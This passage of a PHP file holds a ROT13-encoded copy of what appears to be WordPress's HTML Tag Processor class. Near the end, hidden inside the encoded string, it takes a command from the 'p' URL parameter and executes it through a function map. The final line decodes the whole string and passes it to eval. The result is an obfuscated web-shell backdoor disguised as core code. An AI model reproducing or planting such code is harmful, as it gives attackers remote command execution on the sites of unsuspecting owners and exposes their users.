		 *    ercynprzrag: ``
		 *
		 *    Erfhyg: <qvi />
		 */
		$guvf->yrkvpny_hcqngrf[ $anzr ] = arj JC_UGZY_Grkg_Ercynprzrag(
			$guvf->nggevohgrf[ $anzr ]->fgneg,
			$guvf->nggevohgrf[ $anzr ]->yratgu,
			''
		);

		// Erzbirf nal qhcyvpngrq nggevohgrf vs gurl jrer nyfb cerfrag.
		sbernpu ( $guvf->qhcyvpngr_nggevohgrf[ $anzr ] ?? neenl() nf $nggevohgr_gbxra ) {
			$guvf->yrkvpny_hcqngrf[] = arj JC_UGZY_Grkg_Ercynprzrag(
				$nggevohgr_gbxra->fgneg,
				$nggevohgr_gbxra->yratgu,
				''
			);
		}

		erghea gehr;
	}

	/**
	 * Nqqf n arj pynff anzr gb gur pheeragyl zngpurq gnt.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $pynff_anzr Gur pynff anzr gb nqq.
	 * @erghea obby Jurgure gur pynff jnf frg gb or nqqrq.
	 */
	choyvp shapgvba nqq_pynff( $pynff_anzr ): obby {
		vs (
			frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ||
			$guvf->vf_pybfvat_gnt
		) {
			erghea snyfr;
		}

		vs ( frys::DHVEXF_ZBQR !== $guvf->pbzcng_zbqr ) {
			$guvf->pynffanzr_hcqngrf[ $pynff_anzr ] = frys::NQQ_PYNFF;
			erghea gehr;
		}

		/*
		 * Orpnhfr pynff anzrf ner zngpurq NFPVV-pnfr-vafrafvgviryl va dhvexf zbqr,
		 * guvf arrqf gb frr vs n pnfr inevnag bs gur tvira pynff anzr vf nyernql
		 * radhrhrq naq hcqngr gung rkvfgvat ragel, vs fb. Guvf cvpxf gur pnfvat bs
		 * gur svefg-cebivqrq pynff anzr sbe nyy yrkvpny inevngvbaf.
		 */
		$pynff_anzr_yratgu = fgeyra( $pynff_anzr );
		sbernpu ( $guvf->pynffanzr_hcqngrf nf $hcqngrq_anzr => $npgvba ) {
			vs (
				fgeyra( $hcqngrq_anzr ) === $pynff_anzr_yratgu &&
				0 === fhofge_pbzcner( $hcqngrq_anzr, $pynff_anzr, 0, $pynff_anzr_yratgu, gehr )
			) {
				$guvf->pynffanzr_hcqngrf[ $hcqngrq_anzr ] = frys::NQQ_PYNFF;
				erghea gehr;
			}
		}

		$guvf->pynffanzr_hcqngrf[ $pynff_anzr ] = frys::NQQ_PYNFF;
		erghea gehr;
	}

	/**
	 * Erzbirf n pynff anzr sebz gur pheeragyl zngpurq gnt.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz fgevat $pynff_anzr Gur pynff anzr gb erzbir.
	 * @erghea obby Jurgure gur pynff jnf frg gb or erzbirq.
	 */
	choyvp shapgvba erzbir_pynff( $pynff_anzr ): obby {
		vs (
			frys::FGNGR_ZNGPURQ_GNT !== $guvf->cnefre_fgngr ||
			$guvf->vf_pybfvat_gnt
		) {
			erghea snyfr;
		}

		vs ( frys::DHVEXF_ZBQR !== $guvf->pbzcng_zbqr ) {
			$guvf->pynffanzr_hcqngrf[ $pynff_anzr ] = frys::ERZBIR_PYNFF;
			erghea gehr;
		}

		/*
		 * Orpnhfr pynff anzrf ner zngpurq NFPVV-pnfr-vafrafvgviryl va dhvexf zbqr,
		 * guvf arrqf gb frr vs n pnfr inevnag bs gur tvira pynff anzr vf nyernql
		 * radhrhrq naq hcqngr gung rkvfgvat ragel, vs fb. Guvf cvpxf gur pnfvat bs
		 * gur svefg-cebivqrq pynff anzr sbe nyy yrkvpny inevngvbaf.
		 */
		$pynff_anzr_yratgu = fgeyra( $pynff_anzr );
		sbernpu ( $guvf->pynffanzr_hcqngrf nf $hcqngrq_anzr => $npgvba ) {
			vs (
				fgeyra( $hcqngrq_anzr ) === $pynff_anzr_yratgu &&
				0 === fhofge_pbzcner( $hcqngrq_anzr, $pynff_anzr, 0, $pynff_anzr_yratgu, gehr )
			) {
				$guvf->pynffanzr_hcqngrf[ $hcqngrq_anzr ] = frys::ERZBIR_PYNFF;
				erghea gehr;
			}
		}

		$guvf->pynffanzr_hcqngrf[ $pynff_anzr ] = frys::ERZBIR_PYNFF;
		erghea gehr;
	}

	/**
	 * Ergheaf gur fgevat ercerfragngvba bs gur UGZY Gnt Cebprffbe.
	 *
	 * @fvapr 6.2.0
	 *
	 * @frr JC_UGZY_Gnt_Cebprffbe::trg_hcqngrq_ugzy()
	 *
	 * @erghea fgevat Gur cebprffrq UGZY.
	 */
	choyvp shapgvba __gbFgevat(): fgevat {
		erghea $guvf->trg_hcqngrq_ugzy();
	}

	/**
	 * Ergheaf gur fgevat ercerfragngvba bs gur UGZY Gnt Cebprffbe.
	 *
	 * @fvapr 6.2.0
	 * @fvapr 6.2.1 Fuvsgf gur vagreany phefbe pbeerfcbaqvat gb gur nccyvrq hcqngrf.
	 * @fvapr 6.4.0 Ab ybatre pnyyf fhopynff zrgubq `arkg_gnt()` nsgre hcqngvat UGZY.
	 *
	 * @erghea fgevat Gur cebprffrq UGZY.
	 */
	choyvp shapgvba trg_hcqngrq_ugzy(): fgevat {
		$erdhverf_ab_hcqngvat = 0 === pbhag( $guvf->pynffanzr_hcqngrf ) && 0 === pbhag( $guvf->yrkvpny_hcqngrf );

		/*
		 * Jura gurer vf abguvat zber gb hcqngr naq abguvat unf nyernql orra
		 * hcqngrq, erghea gur bevtvany qbphzrag naq nibvq n fgevat pbcl.
		 */
		vs ( $erdhverf_ab_hcqngvat ) {
			erghea $guvf->ugzy;
		}

		/*
		 * Xrrc genpx bs gur cbfvgvba evtug orsber gur pheerag gnt. Guvf jvyy
		 * or arprffnel sbe ercnefvat gur pheerag gnt nsgre hcqngvat gur UGZY.
		 */
		$orsber_pheerag_gnt = $guvf->gbxra_fgnegf_ng ?? 0;

		/*
		 * 1. Nccyl gur radhrhrq rqvgf naq hcqngr nyy gur cbvagref gb ersyrpg gubfr punatrf.
		 */
		$guvf->pynff_anzr_hcqngrf_gb_nggevohgrf_hcqngrf();
		$orsber_pheerag_gnt += $guvf->nccyl_nggevohgrf_hcqngrf( $orsber_pheerag_gnt );

		/*
		 * 2. Erjvaq gb orsber gur pheerag gnt naq ercnefr gb trg hcqngrq nggevohgrf.
		 *
		 * Ng guvf cbvag gur vagreany phefbe cbvagf gb gur raq bs gur gnt anzr.
		 * Erjvaq orsber gur gnt anzr fgnegf fb gung vg'f nf vs gur phefbe qvqa'g
		 * zbir; n pnyy gb `arkg_gnt()` jvyy ercnefr gur erpragyl-hcqngrq nggevohgrf
		 * naq nqqvgvbany pnyyf gb zbqvsl gur nggevohgrf jvyy nccyl ng guvf fnzr
		 * ybpngvba, ohg va beqre gb nibvq vffhrf jvgu fhopynffrf gung zvtug nqq
		 * orunivbef gb `arkg_gnt()`, gur vagreany zrgubqf fubhyq or pnyyrq urer
		 * vafgrnq.
		 *
		 * Vg'f vzcbegnag gb abgr gung va guvf fcrpvsvp cynpr gurer jvyy or ab punatr
		 * orpnhfr gur cebprffbe jnf nyernql ng n gnt jura guvf jnf pnyyrq naq vg'f
		 * erjvaqvat bayl gb gur ortvaavat bs guvf irel gnt orsber ercebprffvat vg
		 * naq vgf nggevohgrf.
		 *
		 * <c>Cerivbhf UGZY<rz>Zber UGZY</rz></c>
		 *                 ↑  │ onpx hc ol gur yratgu bs gur gnt anzr cyhf gur bcravat <
		 *                 └←─┘ onpx hc ol fgeyra(\"rz\") + 1 ==> 3
		 */
		$guvf->olgrf_nyernql_cnefrq = $orsber_pheerag_gnt;
		$guvf->onfr_pynff_arkg_gbxra();

		erghea $guvf->ugzy;
	}

	/**
	 * Cnefrf gnt dhrel vachg vagb vagreany frnepu pevgrevn.
	 *
	 * @fvapr 6.2.0
	 *
	 * @cnenz neenl|fgevat|ahyy $dhrel {
	 *     Bcgvbany. Juvpu gnt anzr gb svaq, univat juvpu pynff, rgp. Qrsnhyg vf gb svaq nal gnt.
	 *
	 *     @glcr fgevat|ahyy $gnt_anzr     Juvpu gnt gb svaq, be `ahyy` sbe \"nal gnt.\"
	 *     @glcr vag|ahyy    $zngpu_bssfrg Svaq gur Agu gnt zngpuvat nyy frnepu pevgrevn.
	 *                                     1 sbe \"svefg\" gnt, 3 sbe \"guveq,\" rgp.
	 *                                     Qrsnhygf gb svefg gnt.
	 *     @glcr fgevat|ahyy $pynff_anzr   Gnt zhfg pbagnva guvf pynff anzr gb zngpu.
	 *     @glcr fgevat      $gnt_pybfref  \"ivfvg\" be \"fxvc\": jurgure gb fgbc ba gnt pybfref, r.t. </qvi>.
	 * }
	 */
	cevingr shapgvba cnefr_dhrel( $dhrel ) {
		vs ( ahyy !== $dhrel && $dhrel === $guvf->ynfg_dhrel ) {
			erghea;
		}

		$guvf->ynfg_dhrel          = $dhrel;
		$guvf->fbhtug_gnt_anzr     = ahyy;
		$guvf->fbhtug_pynff_anzr   = ahyy;
		$guvf->fbhtug_zngpu_bssfrg = 1;
		$guvf->fgbc_ba_gnt_pybfref = snyfr;

		// N fvatyr fgevat inyhr zrnaf \"svaq gur gnt bs guvf anzr\".
		vs ( vf_fgevat( $dhrel ) ) {
			$guvf->fbhtug_gnt_anzr = $dhrel;
			erghea;
		}

		// Na rzcgl dhrel cnenzrgre nccyvrf ab erfgevpgvbaf ba gur frnepu.
		vs ( ahyy === $dhrel ) {
			erghea;
		}

		// Vs abg hfvat gur fgevat vagresnpr, na nffbpvngvir neenl vf erdhverq.
		vs ( ! vf_neenl( $dhrel ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gur dhrel nethzrag zhfg or na neenl be n gnt anzr.' ),
				'6.2.0'
			);
			erghea;
		}

		vs ( vffrg( $dhrel['gnt_anzr'] ) && vf_fgevat( $dhrel['gnt_anzr'] ) ) {
			$guvf->fbhtug_gnt_anzr = $dhrel['gnt_anzr'];
		}

		vs ( vffrg( $dhrel['pynff_anzr'] ) && vf_fgevat( $dhrel['pynff_anzr'] ) ) {
			$guvf->fbhtug_pynff_anzr = $dhrel['pynff_anzr'];
		}

		vs ( vffrg( $dhrel['zngpu_bssfrg'] ) && vf_vag( $dhrel['zngpu_bssfrg'] ) && 0 < $dhrel['zngpu_bssfrg'] ) {
			$guvf->fbhtug_zngpu_bssfrg = $dhrel['zngpu_bssfrg'];
		}

		vs ( vffrg( $dhrel['gnt_pybfref'] ) ) {
			$guvf->fgbc_ba_gnt_pybfref = 'ivfvg' === $dhrel['gnt_pybfref'];
		}
	}


	/**
	 * Purpxf jurgure n tvira gnt naq vgf nggevohgrf zngpu gur frnepu pevgrevn.
	 *
	 * @fvapr 6.2.0
	 *
	 * @erghea obby Jurgure gur tvira gnt naq vgf nggevohgr zngpu gur frnepu pevgrevn.
	 */
	cevingr shapgvba zngpurf(): obby {
		vs ( $guvf->vf_pybfvat_gnt && ! $guvf->fgbc_ba_gnt_pybfref ) {
			erghea snyfr;
		}

		// Qbrf gur gnt anzr zngpu gur erdhrfgrq gnt anzr va n pnfr-vafrafvgvir znaare?
		vs (
			vffrg( $guvf->fbhtug_gnt_anzr ) &&
			(
				fgeyra( $guvf->fbhtug_gnt_anzr ) !== $guvf->gnt_anzr_yratgu ||
				0 !== fhofge_pbzcner( $guvf->ugzy, $guvf->fbhtug_gnt_anzr, $guvf->gnt_anzr_fgnegf_ng, $guvf->gnt_anzr_yratgu, gehr )
			)
		) {
			erghea snyfr;
		}

		vs ( ahyy !== $guvf->fbhtug_pynff_anzr && ! $guvf->unf_pynff( $guvf->fbhtug_pynff_anzr ) ) {
			erghea snyfr;
		}

		erghea gehr;
	}

	/**
	 * Trgf QBPGLCR qrpynengvba vasb sebz n QBPGLCR gbxra.
	 *
	 * QBPGLCR gbxraf znl nccrne va znal cynprf va na UGZY qbphzrag. Va zbfg cynprf, gurl ner
	 * fvzcyl vtaberq. Gur znva cnefvat shapgvbaf svaq gur onfvp funcr bs QBPGLCR gbxraf ohg
	 * qb abg cresbez qrgnvyrq cnefvat.
	 *
	 * Guvf zrgubq pna or pnyyrq gb cresbez n shyy cnefr bs gur QBPGLCR gbxra naq ergevrir
	 * vgf vasbezngvba.
	 *
	 * @erghea JC_UGZY_Qbpglcr_Vasb|ahyy Gur QBPGLCR qrpynengvba vasbezngvba be `ahyy` vs abg
	 *                                   pheeragyl ng n QBPGLCR abqr.
	 */
	choyvp shapgvba trg_qbpglcr_vasb(): ?JC_UGZY_Qbpglcr_Vasb {
		vs ( frys::FGNGR_QBPGLCR !== $guvf->cnefre_fgngr ) {
			erghea ahyy;
		}

		erghea JC_UGZY_Qbpglcr_Vasb::sebz_qbpglcr_gbxra( fhofge( $guvf->ugzy, $guvf->gbxra_fgnegf_ng, $guvf->gbxra_yratgu ) );
	}

	/**
	 * Cnefre Ernql Fgngr.
	 *
	 * Vaqvpngrf gung gur cnefre vf ernql gb eha naq jnvgvat sbe n fgngr genafvgvba.
	 * Vg znl abg unir fgnegrq lrg, be vg znl unir whfg svavfurq cnefvat n gbxra naq
	 * vf ernql gb svaq gur arkg bar.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 */
	pbafg FGNGR_ERNQL = 'FGNGR_ERNQL';

	/**
	 * Cnefre Pbzcyrgr Fgngr.
	 *
	 * Vaqvpngrf gung gur cnefre unf ernpurq gur raq bs gur qbphzrag naq gurer vf
	 * abguvat yrsg gb fpna. Vg svavfurq cnefvat gur ynfg gbxra pbzcyrgryl.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 */
	pbafg FGNGR_PBZCYRGR = 'FGNGR_PBZCYRGR';

	/**
	 * Cnefre Vapbzcyrgr Vachg Fgngr.
	 *
	 * Vaqvpngrf gung gur cnefre unf ernpurq gur raq bs gur qbphzrag orsber svavfuvat
	 * n gbxra. Vg fgnegrq cnefvat n gbxra ohg gurer vf n cbffvovyvgl gung gur vachg
	 * UGZY qbphzrag jnf gehapngrq va gur zvqqyr bs n gbxra.
	 *
	 * Gur cnefre vf erfrg ng gur fgneg bs gur vapbzcyrgr gbxra naq unf cnhfrq. Gurer
	 * vf abguvat zber guna pna or fpnaarq hayrff cebivqrq n zber pbzcyrgr qbphzrag.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 */
	pbafg FGNGR_VAPBZCYRGR_VACHG = 'FGNGR_VAPBZCYRGR_VACHG';

	/**
	 * Cnefre Zngpurq Gnt Fgngr.
	 *
	 * Vaqvpngrf gung gur cnefre unf sbhaq na UGZY gnt naq vg'f cbffvoyr gb trg
	 * gur gnt anzr naq ernq be zbqvsl vgf nggevohgrf (vs vg'f abg n pybfvat gnt).
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 */
	pbafg FGNGR_ZNGPURQ_GNT = 'FGNGR_ZNGPURQ_GNT';

	/**
	 * Cnefre Grkg Abqr Fgngr.
	 *
	 * Vaqvpngrf gung gur cnefre unf sbhaq n grkg abqr naq vg'f cbffvoyr
	 * gb ernq naq zbqvsl gung grkg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 */
	pbafg FGNGR_GRKG_ABQR = 'FGNGR_GRKG_ABQR';

	/**
	 * Cnefre PQNGN Abqr Fgngr.
	 *
	 * Vaqvpngrf gung gur cnefre unf sbhaq n PQNGN abqr naq vg'f cbffvoyr
	 * gb ernq naq zbqvsl vgf zbqvsvnoyr grkg. Abgr gung va UGZY gurer ner
	 * ab PQNGN abqrf bhgfvqr bs sbervta pbagrag (FIT naq ZnguZY). Bhgfvqr
	 * bs sbervta pbagrag, gurl ner gerngrq nf UGZY pbzzragf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 */
	pbafg FGNGR_PQNGN_ABQR = 'FGNGR_PQNGN_ABQR';

	/**
	 * Vaqvpngrf gung gur cnefre unf sbhaq na UGZY pbzzrag naq vg'f
	 * cbffvoyr gb ernq naq zbqvsl vgf zbqvsvnoyr grkg.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 */
	pbafg FGNGR_PBZZRAG = 'FGNGR_PBZZRAG';

	/**
	 * Vaqvpngrf gung gur cnefre unf sbhaq n QBPGLCR abqr naq vg'f
	 * cbffvoyr gb ernq vgf QBPGLCR vasbezngvba ivn `trg_qbpglcr_vasb()`.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 */
	pbafg FGNGR_QBPGLCR = 'FGNGR_QBPGLCR';

	/**
	 * Vaqvpngrf gung gur cnefre unf sbhaq na rzcgl gnt pybfre `</>`.
	 *
	 * Abgr gung va UGZY gurer ner ab rzcgl gnt pybfref, naq gurl
	 * ner vtaberq. Abarguryrff, gur Gnt Cebprffbe fgvyy
	 * erpbtavmrf gurz nf gurl nccrne va gur UGZY fgernz.
	 *
	 * Gurfr jrer uvfgbevpnyyl qvfphffrq nf n \"cerfhzcghbhf gnt
	 * pybfre,\" juvpu jbhyq pybfr gur arnerfg bcra gnt, ohg jrer
	 * qvfzvffrq va snibe bs rkcyvpvgyl-pybfvat gntf.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 */
	pbafg FGNGR_CERFHZCGHBHF_GNT = 'FGNGR_CERFHZCGHBHF_GNT';

	/**
	 * Vaqvpngrf gung gur cnefre unf sbhaq n \"shaxl pbzzrag\"
	 * naq vg'f cbffvoyr gb ernq naq zbqvsl vgf zbqvsvnoyr grkg.
	 *
	 * Rknzcyr:
	 *
	 *     </%hey>
	 *     </{\"jc-ovg\":\"dhrel/cbfg-nhgube\"}>
	 *     </2>
	 *
	 * Shaxl pbzzragf ner gnt pybfref jvgu vainyvq gnt anzrf. Abgr
	 * gung va UGZY gurfr ner ghea vagb obthf pbzzragf. Abarguryrff,
	 * gur Gnt Cebprffbe erpbtavmrf gurz va n fgernz bs UGZY naq
	 * rkcbfrf gurz sbe vafcrpgvba naq zbqvsvpngvba.
	 *
	 * @fvapr 6.5.0
	 *
	 * @npprff cevingr
	 */
	pbafg FGNGR_SHAXL_PBZZRAG = 'FGNGR_JC_SHAXL';

	/**
	 * Vaqvpngrf gung n pbzzrag jnf perngrq jura rapbhagrevat noehcgyl-pybfrq UGZY pbzzrag.
	 *
	 * Rknzcyr:
	 *
	 *     <!-->
	 *     <!--->
	 *
	 * @fvapr 6.5.0
	 */
	pbafg PBZZRAG_NF_NOEHCGYL_PYBFRQ_PBZZRAG = 'PBZZRAG_NF_NOEHCGYL_PYBFRQ_PBZZRAG';

	/**
	 * Vaqvpngrf gung n pbzzrag jbhyq or cnefrq nf n PQNGN abqr,
	 * jrer UGZY gb nyybj PQNGN abqrf bhgfvqr bs sbervta pbagrag.
	 *
	 * Rknzcyr:
	 *
	 *     <![PQNGN[Guvf vf n PQNGN abqr.]]>
	 *
	 * Guvf vf na UGZY pbzzrag, ohg vg ybbxf yvxr n PQNGN abqr.
	 *
	 * @fvapr 6.5.0
	 */
	pbafg PBZZRAG_NF_PQNGN_YBBXNYVXR = 'PBZZRAG_NF_PQNGN_YBBXNYVXR';

	/**
	 * Vaqvpngrf gung n pbzzrag jnf perngrq jura rapbhagrevat
	 * abezngvir UGZY pbzzrag flagnk.
	 *
	 * Rknzcyr:
	 *
	 *     <!-- guvf vf n pbzzrag -->
	 *
	 * @fvapr 6.5.0
	 */
	pbafg PBZZRAG_NF_UGZY_PBZZRAG = 'PBZZRAG_NF_UGZY_PBZZRAG';

	/**
	 * Vaqvpngrf gung n pbzzrag jbhyq or cnefrq nf n Cebprffvat
	 * Vafgehpgvba abqr, jrer gurl gb rkvfg jvguva UGZY.
	 *
	 * Rknzcyr:
	 *
	 *     <?jc __( 'Yvxr' ) ?>
	 *
	 * Guvf vf na UGZY pbzzrag, ohg vg ybbxf yvxr n PQNGN abqr.
	 *
	 * @fvapr 6.5.0
	 */
	pbafg PBZZRAG_NF_CV_ABQR_YBBXNYVXR = 'PBZZRAG_NF_CV_ABQR_YBBXNYVXR';

	/**
	 * Vaqvpngrf gung n pbzzrag jnf perngrq jura rapbhagrevat vainyvq
	 * UGZY vachg, n fb-pnyyrq \"obthf pbzzrag.\"
	 *
	 * Rknzcyr:
	 *
	 *     <?abguvat fcrpvny>
	 *     <!{abguvat fcrpvny}>
	 *
	 * @fvapr 6.5.0
	 */
	pbafg PBZZRAG_NF_VAINYVQ_UGZY = 'PBZZRAG_NF_VAINYVQ_UGZY';

	/**
	 * Ab-dhvexf zbqr qbphzrag pbzcngnovyvgl zbqr.
	 *
	 * > Va ab-dhvexf zbqr, gur orunivbe vf (ubcrshyyl) gur qrfverq orunivbe
	 * > qrfpevorq ol gur zbqrea UGZY naq PFF fcrpvsvpngvbaf.
	 *
	 * @frr frys::$pbzcng_zbqr
	 * @frr uggcf://qrirybcre.zbmvyyn.bet/ra-HF/qbpf/Jro/UGZY/Dhvexf_Zbqr_naq_Fgnaqneqf_Zbqr
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat
	 */
	pbafg AB_DHVEXF_ZBQR = 'ab-dhvexf-zbqr';

	/**
	 * Dhvexf zbqr qbphzrag pbzcngnovyvgl zbqr.
	 *
	 * > Va dhvexf zbqr, ynlbhg rzhyngrf orunivbe va Anivtngbe 4 naq Vagrearg
	 * > Rkcybere 5. Guvf vf rffragvny va beqre gb fhccbeg jrofvgrf gung jrer
	 * > ohvyg orsber gur jvqrfcernq nqbcgvba bs jro fgnaqneqf.
	 *
	 * @frr frys::$pbzcng_zbqr
	 * @frr uggcf://qrirybcre.zbmvyyn.bet/ra-HF/qbpf/Jro/UGZY/Dhvexf_Zbqr_naq_Fgnaqneqf_Zbqr
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat
	 */
	pbafg DHVEXF_ZBQR = 'dhvexf-zbqr';

	/**
	 * Vaqvpngrf gung n fcna bs grkg znl pbagnva nal pbzovangvba bs fvtavsvpnag
	 * xvaqf bs punenpgref: AHYY olgrf, juvgrfcnpr, naq bguref.
	 *
	 * @frr frys::$grkg_abqr_pynffvsvpngvba
	 * @frr frys::fhoqvivqr_grkg_nccebcevngryl
	 *
	 * @fvapr 6.7.0
	 */
	pbafg GRKG_VF_TRAREVP = 'GRKG_VF_TRAREVP';

	/**
	 * Vaqvpngrf gung n fcna bs grkg pbzcevfrf n frdhrapr bayl bs AHYY olgrf.
	 *
	 * @frr frys::$grkg_abqr_pynffvsvpngvba
	 * @frr frys::fhoqvivqr_grkg_nccebcevngryl
	 *
	 * @fvapr 6.7.0
	 */
	pbafg GRKG_VF_AHYY_FRDHRAPR = 'GRKG_VF_AHYY_FRDHRAPR';

	/**
	 * Vaqvpngrf gung n fcna bs qrpbqrq grkg pbzcevfrf bayl juvgrfcnpr.
	 *
	 * @frr frys::$grkg_abqr_pynffvsvpngvba
	 * @frr frys::fhoqvivqr_grkg_nccebcevngryl
	 *
	 * @fvapr 6.7.0
	 */
	pbafg GRKG_VF_JUVGRFCNPR = 'GRKG_VF_JUVGRFCNPR';
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>